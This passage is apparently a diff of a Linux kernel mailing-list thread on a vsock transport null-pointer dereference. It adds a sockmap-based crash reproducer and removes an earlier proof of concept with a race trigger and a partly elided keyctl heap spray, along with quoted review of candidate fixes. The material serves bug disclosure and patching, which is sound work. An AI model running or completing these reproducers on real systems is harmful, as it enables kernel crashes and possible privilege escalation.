+	union bpf_attr attr = {
+		.map_type = BPF_MAP_TYPE_SOCKMAP,
+		.key_size = sizeof(int),
+		.value_size = sizeof(int),
+		.max_entries = 1
+	};
+	int map;
+
+	map = syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
+	if (map < 0)
+		die("create_sockmap");
+
+	return map;
 }
 
-long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
+static void map_update_elem(int fd, int key, int value)
 {
-	return syscall(__NR_keyctl, option, arg2, arg3, arg4, arg5);
+	union bpf_attr attr = {
+		.map_fd = fd,
+		.key = (uint64_t)&key,
+		.value = (uint64_t)&value,
+		.flags = BPF_ANY
+	};
+
+	if (syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)))
+		die("map_update_elem");
 }
 
-unsigned long long get_jiffies()
+int main(void)
 {
-	return times(NULL) * 10;
-}
+	struct sockaddr_vm addr = {
+		.svm_family = AF_VSOCK,
+		.svm_port = VMADDR_PORT_ANY,
+		.svm_cid = VMADDR_CID_LOCAL
+	};
+	socklen_t alen = sizeof(addr);
+	int map, s;
 
-int race_trigger(void *arg)
-{
-	struct sockaddr_vm connect_addr = {0};
-	struct sockaddr_vm listen_addr = {0};
-	pid_t conn_pid, listen_pid;
+	map = create_sockmap();
 
-	int socket_a = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
-	int socket_b = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
+	s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
+	if (s < 0)
+		die("socket");
 
-	cid_port_num++;
+	if (!connect(s, (struct sockaddr *)&addr, alen))
+		die("connect #1");
+	perror("ok, connect #1 failed; transport set");
 
-	connect_addr.svm_family = AF_VSOCK;
-	connect_addr.svm_cid = VMADDR_CID_LOCAL;
-	connect_addr.svm_port = cid_port_num;
+	map_update_elem(map, 0, s);
 
-	listen_addr.svm_family = AF_VSOCK;
-	listen_addr.svm_cid = VMADDR_CID_LOCAL;
-	listen_addr.svm_port = cid_port_num;
-	bind(socket_a, (struct sockaddr *)&listen_addr, sizeof(listen_addr));
+	addr.svm_cid = 42;
+	if (!connect(s, (struct sockaddr *)&addr, alen))
+		die("connect #2");
+	perror("ok, connect #2 failed; transport unset");
 
-	listen(socket_a, 0);
-
-	_pin_to_cpu(MAIN_CPU);
-
-	conn_pid = fork();
-	if (conn_pid == 0) {
-		/*
-		struct itimerspec it = {};
-		int tfd;
-
-		FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);
-		unsigned long tmp;
-		it.it_value.tv_sec = 0;
-		it.it_value.tv_nsec = 1 * NS_PER_JIFFIE;
-		FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);
-
-		read(tfd, &tmp, sizeof(tmp));
-		*/
-
-		connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));
-	} else {
-		/*
-		struct itimerspec it = {};
-		int tfd;
-
-		FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);
-		unsigned long tmp;
-		it.it_value.tv_sec = 0;
-		it.it_value.tv_nsec = 1 * NS_PER_JIFFIE;
-		FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);
-
-		read(tfd, &tmp, sizeof(tmp));
-		*/
-
-		kill(conn_pid, SIGKILL);
-		wait(NULL);
-	}
-
-	connect_addr.svm_cid = 0;
-	connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));
-
+	recv(s, NULL, 0, 0);
 	return 0;
 }
 
-int heap_spraying(void *arg)
-{
-	union key_payload payload = {};
-	union key_payload readout = {};
-	key_serial_t keys[256] = {};
-
-	status_spray = SPRAY_ERROR;
-
-	int race_trigger_pid = clone(race_trigger, trigger_stack, CLONE_VM | SIGCHLD, NULL);
-	FAIL_IF(race_trigger_pid < 0);
-
-	const size_t payload_size = sizeof(payload.vvs) - sizeof(payload.key.header);
-	memset(&payload, '?', sizeof(payload));
-
-	_pin_to_cpu(MAIN_CPU);
-
-	unsigned long long begin = get_jiffies();
-	do {
-		// ...
-	} while (get_jiffies() - begin < 25);
-
-	status_spray = SPRAY_RETRY;
-
-	return 0;
-}
-
-int main()
-{
-	srand(time(NULL));
-
-	trigger_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
-	FAIL_IF(trigger_stack == MAP_FAILED);
-	trigger_stack += 0x8000;
-	heap_spray_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
-	FAIL_IF(heap_spray_stack == MAP_FAILED);
-	heap_spray_stack += 0x8000;
-
-	do {
-		int spray_worker_pid = clone(heap_spraying, heap_spray_stack, CLONE_VM | SIGCHLD, NULL);
-		FAIL_IF(spray_worker_pid < 0);
-		FAIL_IF(waitpid(spray_worker_pid, NULL, 0) < 0);
-	} while (status_spray == SPRAY_RETRY);
-
-	return 0;
-}
-```
-
-> 
-> Would be nice to add a test in tools/testing/vsock/vsock_test.c
-> 
-> Thanks,
-> Stefano
-> 
-> > > > >      vsock_assign_transport()
-> > > > >        virtio_transport_release()
-> > > > >          virtio_transport_close()
-> > > > >            virtio_transport_shutdown()
-> > > > >              virtio_transport_send_pkt_info()
-> > > > >                vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
-> > > > >                  queue_work(vsock_loopback_work)
-> > > > >        vsock_deassign_transport()
-> > > > >          vsk->transport = NULL;
-> > > > >                                                               vsock_loopback_work()
-> > > > >                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_SHUTDOWN)
-> > > > >                                                                   virtio_transport_recv_connected()
-> > > > >                                                                     virtio_transport_reset()
-> > > > >                                                                       virtio_transport_send_pkt_info()
-> > > > >                                                                         vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_RST)
-> > > > >                                                                           queue_work(vsock_loopback_work)
-> > > > > 
-> > > > >                                                               vsock_loopback_work()
-> > > > >                                                                 virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_RST)
-> > > > > 								   virtio_transport_recv_disconnecting()
-> > > > > 								     virtio_transport_do_close()
-> > > > > 								       vsock_stream_has_data()
-> > > > > 								         vsk->transport->stream_has_data(vsk);    // null-ptr-deref
-> > > > > 
-> > > > > To resolve this issue, add a check for vsk->transport, similar to
-> > > > > functions like vsock_send_shutdown().
-> > > > > 
-> > > > > Fixes: fe502c4a38d9 ("vsock: add 'transport' member in the struct vsock_sock")
-> > > > > Signed-off-by: Hyunwoo Kim <v4bel@theori.io>
-> > > > > Signed-off-by: Wongi Lee <qwerty@theori.io>
-> > > > > ---
-> > > > > net/vmw_vsock/af_vsock.c | 3 +++
-> > > > > 1 file changed, 3 insertions(+)
-> > > > > 
-> > > > > diff --git a/net/vmw_vsock/af_vsock.c b/net/vmw_vsock/af_vsock.c
-> > > > > index 5cf8109f672a..a0c008626798 100644
-> > > > > --- a/net/vmw_vsock/af_vsock.c
-> > > > > +++ b/net/vmw_vsock/af_vsock.c
-> > > > > @@ -870,6 +870,9 @@ EXPORT_SYMBOL_GPL(vsock_create_connected);
-> > > > > 
-> > > > > s64 vsock_stream_has_data(struct vsock_sock *vsk)
-> > > > > {
-> > > > > +	if (!vsk->transport)
-> > > > > +		return 0;
-> > > > > +
-> > > > 
-> > > > I understand that this alleviates the problem, but IMO it is not the right
-> > > > solution. We should understand why we're still processing the packet in the
-> > > > context of this socket if it's no longer assigned to the right transport.
-> > > 
-> > > Got it. I agree with you.
-> > > 
-> > > > 
-> > > > Maybe we can try to improve virtio_transport_recv_pkt() and check if the
-> > > > vsk->transport is what we expect, I mean something like this (untested):
-> > > > 
-> > > > diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
-> > > > index 9acc13ab3f82..18b91149a62e 100644
-> > > > --- a/net/vmw_vsock/virtio_transport_common.c
-> > > > +++ b/net/vmw_vsock/virtio_transport_common.c
-> > > > @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
-> > > > 
-> > > >        lock_sock(sk);
-> > > > 
-> > > > -       /* Check if sk has been closed before lock_sock */
-> > > > -       if (sock_flag(sk, SOCK_DONE)) {
-> > > > +       /* Check if sk has been closed or assigned to another transport before
-> > > > +        * lock_sock
-> > > > +        */
-> > > > +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != t) {
-> > > >                (void)virtio_transport_reset_no_sock(t, skb);
-> > > >                release_sock(sk);
-> > > >                sock_put(sk);
-> > > > 
-> > > > BTW I'm not sure it is the best solution, we have to check that we do not
-> > > > introduce strange cases, but IMHO we have to solve the problem earlier in
-> > > > virtio_transport_recv_pkt().
-> > > 
-> > > At least for vsock_loopback.c, this change doesn’t seem to introduce any
-> > > particular issues.
-> > 
-> > But was it working for you? because the check was wrong, this one should
-> > work, but still, I didn't have time to test it properly, I'll do later.
-> > 
-> > diff --git a/net/vmw_vsock/virtio_transport_common.c b/net/vmw_vsock/virtio_transport_common.c
-> > index 9acc13ab3f82..ddecf6e430d6 100644
-> > --- a/net/vmw_vsock/virtio_transport_common.c
-> > +++ b/net/vmw_vsock/virtio_transport_common.c
-> > @@ -1628,8 +1628,10 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
-> >        lock_sock(sk);
-> > -       /* Check if sk has been closed before lock_sock */
-> > -       if (sock_flag(sk, SOCK_DONE)) {
-> > +       /* Check if sk has been closed or assigned to another transport before
-> > +        * lock_sock
-> > +        */
-> > +       if (sock_flag(sk, SOCK_DONE) || vsk->transport != &t->transport) {
-> >                (void)virtio_transport_reset_no_sock(t, skb);
-> >                release_sock(sk);
-> >                sock_put(sk);
-> > 
-> > > 
-> > > And separately, I think applying the vsock_stream_has_data patch would help
-> > > prevent potential issues that could arise when vsock_stream_has_data is
-> > > called somewhere.
-> > 
-> > Not sure, with that check, we wouldn't have seen this problem we had, so
-> > either add an error, but mute it like this I don't think is a good idea,
-> > also because the same function is used in a hot path, so an extra check
-> > could affect performance (not much honestly in this case, but adding it
-> > anywhere could).
-> > 
-> > Thanks,
-> > Stefano
-> > 
-> > > 
-> > > > 
-> > > > Thanks,
-> > > > Stefano
-> > > > 
-> > > > > 	return vsk->transport->stream_has_data(vsk);
-> > > > > }
-> > > > > EXPORT_SYMBOL_GPL(vsock_stream_has_data);
-> > > > > --
-> > > > > 2.34.1
-> > > > > 
-> > > > 
-> > > 
-> 
